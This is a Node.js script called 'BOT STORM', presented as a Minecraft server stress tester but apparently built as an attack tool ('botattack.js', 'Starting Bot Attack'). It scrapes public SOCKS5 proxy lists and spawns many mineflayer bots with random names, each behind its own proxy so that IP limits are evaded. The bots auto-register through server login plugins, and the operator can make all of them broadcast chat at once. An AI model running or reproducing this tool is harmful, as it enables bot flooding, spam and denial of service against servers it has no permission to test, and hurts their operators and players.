#!/usr/bin/env node

import { spawn, execSync } from 'child_process';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { existsSync, mkdirSync, writeFileSync, readFileSync } from 'fs';
import readline from 'readline';
import https from 'https';
import chalk from 'chalk';
import gradient from 'gradient-string';
import figlet from 'figlet';
import ora from 'ora';
import boxen from 'boxen';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Auto-install dependencies
async function checkAndInstallDependencies() {
    const requiredPackages = ['mineflayer', 'socks', 'chalk', 'gradient-string', 'figlet', 'ora', 'boxen'];
    const missingPackages = [];

    for (const pkg of requiredPackages) {
        try {
            await import(pkg);
        } catch {
            missingPackages.push(pkg);
        }
    }

    if (missingPackages.length > 0) {
        console.log(chalk.yellow('📦 Installing missing packages...'));
        try {
            execSync(`pnpm add ${missingPackages.join(' ')}`, { stdio: 'inherit' });
            console.log(chalk.green('✅ Dependencies installed successfully!\n'));
        } catch (error) {
            console.error(chalk.red('❌ Failed to install dependencies. Please run: pnpm install'));
            process.exit(1);
        }
    }
}

await checkAndInstallDependencies();

// Now import the modules
const mineflayer = (await import('mineflayer')).default;
const { SocksClient } = await import('socks');

// Create necessary directories
const DIRS = {
    base: join(__dirname, 'bot-data'),
    logs: join(__dirname, 'bot-data', 'logs'),
    proxies: join(__dirname, 'bot-data', 'proxies'),
    configs: join(__dirname, 'bot-data', 'configs')
};

Object.values(DIRS).forEach(dir => {
    if (!existsSync(dir)) {
        mkdirSync(dir, { recursive: true });
    }
});

// Cool ASCII art title
function showTitle() {
    console.clear();
    const title = figlet.textSync('BOT STORM', {
        font: 'ANSI Shadow',
        horizontalLayout: 'full'
    });
    console.log(gradient.rainbow(title));
    console.log(chalk.gray('═'.repeat(60)));
    console.log(chalk.cyan('⚡ Minecraft Server Stress Tester v2.0'));
    console.log(chalk.gray('═'.repeat(60) + '\n'));
}

// Stats tracking
const stats = {
    sent: 0,
    joined: 0,
    kicked: 0,
    timeout: 0,
    failed: 0,
    proxiesFound: 0,
    proxiesWorking: 0
};

// Display stats in a cool way
function displayStats() {
    const statsBox = boxen(
        chalk.white(`
${chalk.yellow('📊 LIVE STATISTICS')}

${chalk.green('✅ Joined:')} ${chalk.bold(stats.joined.toString().padEnd(5))} ${chalk.gray('│')} ${chalk.red('❌ Failed:')} ${chalk.bold(stats.failed.toString().padEnd(5))}
${chalk.blue('📤 Sent:')} ${chalk.bold(stats.sent.toString().padEnd(5))} ${chalk.gray('│')} ${chalk.red('🚫 Kicked:')} ${chalk.bold(stats.kicked.toString().padEnd(5))}
${chalk.yellow('⏱  Timeout:')} ${chalk.bold(stats.timeout.toString().padEnd(5))} ${chalk.gray('│')} ${chalk.magenta('🌐 Proxies:')} ${chalk.bold(stats.proxiesWorking + '/' + stats.proxiesFound)}
        `.trim()),
        {
            padding: 1,
            margin: 1,
            borderStyle: 'round',
            borderColor: 'cyan',
            backgroundColor: '#1a1a1a'
        }
    );

    // Move cursor to position and print stats
    process.stdout.write('\x1B[10;0H' + statsBox);
}

// Fetch proxies with progress
async function fetchProxiesWithProgress() {
    const spinner = ora({
        text: 'Fetching proxy lists...',
        color: 'cyan',
        spinner: 'dots'
    }).start();

    const urls = [
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
        'https://www.proxy-list.download/api/v1/get?type=socks5',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
        'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt'
    ];

    let allProxies = [];

    for (const [index, url] of urls.entries()) {
        spinner.text = `Fetching proxy list ${index + 1}/${urls.length}...`;
        try {
            const proxies = await fetchFromUrl(url);
            allProxies.push(...proxies);
        } catch {
            // Skip failed sources
        }
    }

    allProxies = [...new Set(allProxies)];
    stats.proxiesFound = allProxies.length;
    
    spinner.succeed(chalk.green(`✅ Found ${allProxies.length} unique proxies`));
    
    // Save proxies to file
    const proxyFile = join(DIRS.proxies, `proxies_${Date.now()}.txt`);
    writeFileSync(proxyFile, allProxies.join('\n'));
    
    return allProxies;
}

function fetchFromUrl(url) {
    return new Promise((resolve, reject) => {
        https.get(url, response => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => {
                const proxies = data.split('\n')
                    .filter(line => line.includes(':'))
                    .map(line => line.trim())
                    .filter(line => /^\d+\.\d+\.\d+\.\d+:\d+$/.test(line));
                resolve(proxies);
            });
        }).on('error', reject);
    });
}

// Test proxy with better error handling
async function testProxy(proxy, host, port, timeout = 3000) {
    const [proxyHost, proxyPort] = proxy.split(':');
    
    try {
        const connection = await SocksClient.createConnection({
            proxy: {
                host: proxyHost,
                port: parseInt(proxyPort),
                type: 5
            },
            command: 'connect',
            destination: { host, port },
            timeout
        });
        
        connection.socket.destroy();
        return true;
    } catch {
        return false;
    }
}

// Generate random usernames
function generateUsername() {
    const prefixes = ['Storm', 'Thunder', 'Lightning', 'Shadow', 'Phantom', 'Ghost'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return prefix + Math.floor(Math.random() * 99999);
}

// Enhanced bot class
class EnhancedBot {
    constructor({ host, port, username, version, proxy, index }) {
        this.host = host;
        this.port = port;
        this.username = username;
        this.version = version;
        this.proxy = proxy;
        this.index = index;
        this.connected = false;
        this.messages = [];
        
        this.connect();
    }
    
    connect() {
        const options = {
            host: this.host,
            port: this.port,
            username: this.username,
            version: this.version,
            hideErrors: true,
            checkTimeoutInterval: 30000
        };
        
        if (this.proxy) {
            const [proxyHost, proxyPort] = this.proxy.split(':');
            options.connect = (client) => {
                return SocksClient.createConnection({
                    proxy: {
                        host: proxyHost,
                        port: parseInt(proxyPort),
                        type: 5
                    },
                    command: 'connect',
                    destination: { host: this.host, port: this.port }
                }).then(connection => {
                    client.setSocket(connection.socket);
                    client.emit('connect');
                }).catch(() => {
                    stats.failed++;
                    displayStats();
                });
            };
        }
        
        try {
            this.bot = mineflayer.createBot(options);
            stats.sent++;
            displayStats();
            this.setupListeners();
        } catch (error) {
            stats.failed++;
            displayStats();
        }
    }
    
    setupListeners() {
        this.bot.on('login', () => {
            this.connected = true;
            stats.joined++;
            displayStats();
            this.log(chalk.green('✅ Connected!'));
        });
        
        this.bot.on('spawn', () => {
            this.log(chalk.blue('🏃 Spawned in world'));
        });
        
        this.bot.on('kicked', (reason) => {
            this.connected = false;
            stats.kicked++;
            displayStats();
            this.log(chalk.red(`🚫 Kicked: ${reason}`));
        });
        
        this.bot.on('end', () => {
            this.connected = false;
            stats.timeout++;
            displayStats();
            this.log(chalk.yellow('⏱  Connection ended'));
        });
        
        this.bot.on('error', (err) => {
            this.log(chalk.red(`❌ Error: ${err.message}`));
        });
        
        this.bot.on('message', (message) => {
            const text = message.toString();
            this.messages.push(text);
            
            // Auto-respond to common auth plugins
            if (text.includes('/register')) {
                const password = this.username.split('').reverse().join('');
                this.bot.chat(`/register ${password} ${password}`);
                this.log(chalk.magenta('🔐 Registering...'));
            }
            
            if (text.includes('/login')) {
                const password = this.username.split('').reverse().join('');
                this.bot.chat(`/login ${password}`);
                this.log(chalk.magenta('🔑 Logging in...'));
            }
            
            if (text.includes('premium')) {
                this.bot.chat('/nlogin');
                this.log(chalk.magenta('💎 Premium check...'));
            }
        });
    }
    
    log(message) {
        const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
        console.log(chalk.gray(`[${timestamp}]`) + ` ${chalk.cyan(`Bot${this.index}`)} ${message}`);
    }
    
    sendChat(message) {
        if (this.bot && this.connected) {
            this.bot.chat(message);
        }
    }
    
    disconnect() {
        if (this.bot) {
            this.bot.quit();
        }
    }
}

// Command interface
class CommandInterface {
    constructor() {
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: chalk.cyan('\n> ')
        });
        
        this.bots = [];
    }
    
    start() {
        this.rl.prompt();
        
        this.rl.on('line', (line) => {
            const [command, ...args] = line.trim().split(' ');
            
            switch (command.toLowerCase()) {
                case 'help':
                    this.showHelp();
                    break;
                    
                case 'say':
                    const message = args.join(' ');
                    this.broadcast(message);
                    break;
                    
                case 'stats':
                    displayStats();
                    break;
                    
                case 'clear':
                    showTitle();
                    displayStats();
                    break;
                    
                case 'stop':
                    this.stopAll();
                    break;
                    
                case 'exit':
                    this.exit();
                    break;
                    
                default:
                    if (line.trim()) {
                        this.broadcast(line);
                    }
            }
            
            this.rl.prompt();
        });
    }
    
    showHelp() {
        console.log(boxen(
            chalk.yellow('📋 COMMANDS') + '\n\n' +
            chalk.white('say <message>') + ' - Broadcast message to all bots\n' +
            chalk.white('stats') + ' - Show current statistics\n' +
            chalk.white('clear') + ' - Clear screen and refresh\n' +
            chalk.white('stop') + ' - Disconnect all bots\n' +
            chalk.white('exit') + ' - Exit the program\n' +
            chalk.gray('\nOr just type any message to broadcast'),
            {
                padding: 1,
                borderStyle: 'double',
                borderColor: 'yellow'
            }
        ));
    }
    
    broadcast(message) {
        if (!message) return;
        
        let sent = 0;
        this.bots.forEach(bot => {
            if (bot.connected) {
                bot.sendChat(message);
                sent++;
            }
        });
        
        console.log(chalk.green(`📢 Broadcasted to ${sent} bots: ${message}`));
    }
    
    stopAll() {
        console.log(chalk.yellow('🛑 Stopping all bots...'));
        this.bots.forEach(bot => bot.disconnect());
        this.bots = [];
    }
    
    exit() {
        this.stopAll();
        console.log(chalk.cyan('\n👋 Goodbye!'));
        process.exit(0);
    }
}

// Main function
async function main() {
    showTitle();
    
    // Get server details
    const args = process.argv.slice(2);
    if (args.length < 2) {
        console.log(boxen(
            chalk.yellow('Usage:') + ' node botattack.js <host:port> <version> [maxBots] [delay]\n\n' +
            chalk.gray('Examples:\n') +
            chalk.green('  node botattack.js localhost:25565 1.20.1 10 3000\n') +
            chalk.green('  node botattack.js play.example.com 1.19.4 20 5000\n\n') +
            chalk.cyan('Versions:') + ' 1.20.4, 1.20.1, 1.19.4, 1.19, 1.18.2, 1.17.1, 1.16.5',
            {
                padding: 1,
                borderStyle: 'round',
                borderColor: 'yellow'
            }
        ));
        process.exit(0);
    }
    
    const [hostPort, version, maxBots = '10', delay = '3000'] = args;
    const [host, port] = hostPort.includes(':') 
        ? hostPort.split(':') 
        : [hostPort, '25565'];
    
    const config = {
        host,
        port: parseInt(port),
        version,
        maxBots: parseInt(maxBots),
        delay: parseInt(delay)
    };
    
    console.log(boxen(
        chalk.cyan('🎮 SERVER CONFIGURATION\n\n') +
        `${chalk.white('Host:')} ${config.host}:${config.port}\n` +
        `${chalk.white('Version:')} ${config.version}\n` +
        `${chalk.white('Max Bots:')} ${config.maxBots}\n` +
        `${chalk.white('Spawn Delay:')} ${config.delay}ms`,
        {
            padding: 1,
            borderStyle: 'double',
            borderColor: 'cyan'
        }
    ));
    
    // Fetch and test proxies
    console.log('\n' + chalk.yellow('🌐 Proxy Setup'));
    const allProxies = await fetchProxiesWithProgress();
    
    // Test proxies
    const spinner = ora({
        text: `Testing ${allProxies.length} proxies...`,
        color: 'yellow',
        spinner: 'dots'
    }).start();
    
    const workingProxies = [];
    const proxyBatches = [];
    const batchSize = 50;
    
    for (let i = 0; i < allProxies.length; i += batchSize) {
        proxyBatches.push(allProxies.slice(i, i + batchSize));
    }
    
    for (const [batchIndex, batch] of proxyBatches.entries()) {
        spinner.text = `Testing proxy batch ${batchIndex + 1}/${proxyBatches.length}...`;
        
        const tests = batch.map(proxy => 
            testProxy(proxy, config.host, config.port).then(works => {
                if (works && workingProxies.length < config.maxBots) {
                    workingProxies.push(proxy);
                    stats.proxiesWorking = workingProxies.length;
                    spinner.text = `Found ${workingProxies.length}/${config.maxBots} working proxies...`;
                }
            })
        );
        
        await Promise.allSettled(tests);
        
        if (workingProxies.length >= config.maxBots) break;
    }
    
    spinner.succeed(chalk.green(`✅ Found ${workingProxies.length} working proxies`));
    
    // Save working proxies
    const workingProxyFile = join(DIRS.proxies, `working_proxies_${Date.now()}.txt`);
    writeFileSync(workingProxyFile, workingProxies.join('\n'));
    
    // Start bots
    console.log('\n' + chalk.yellow('🚀 Starting Bot Attack'));
    displayStats();
    
    const cmdInterface = new CommandInterface();
    let botIndex = 0;
    
    function spawnBot() {
        if (botIndex >= config.maxBots) {
            console.log(chalk.green('\n✅ All bots spawned! Type "help" for commands.'));
            return;
        }
        
        const username = generateUsername();
        const proxy = workingProxies[botIndex] || null;
        
        const bot = new EnhancedBot({
            host: config.host,
            port: config.port,
            username,
            version: config.version,
            proxy,
            index: botIndex + 1
        });
        
        cmdInterface.bots.push(bot);
        botIndex++;
        
        // Progress bar
        const progress = Math.floor((botIndex / config.maxBots) * 20);
        const progressBar = '█'.repeat(progress) + '░'.repeat(20 - progress);
        process.stdout.write(`\r${chalk.cyan('Spawning:')} [${progressBar}] ${botIndex}/${config.maxBots}`);
        
        setTimeout(spawnBot, config.delay);
    }
    
    spawnBot();
    cmdInterface.start();
}

// Error handling
process.on('uncaughtException', (error) => {
    console.error(chalk.red('\n❌ Uncaught Exception:'), error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(chalk.red('\n❌ Unhandled Rejection:'), reason);
});

// Start the application
main().catch(console.error);